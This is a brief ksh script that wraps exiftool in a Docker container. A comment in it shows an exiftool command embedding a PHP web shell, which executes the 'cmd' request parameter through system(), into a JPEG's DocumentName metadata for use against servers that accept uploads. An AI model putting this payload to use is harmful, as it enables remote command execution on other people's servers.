#!/usr/bin/env ksh
# -*- coding: utf-8 -*-

function exiftool {
    # code php -DocumentName="<h1>SLOVACUS<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpg
    docker run --rm -v "${PWD}":/root/pub v4tech/exiftool \
           exiftool "${@}"
}


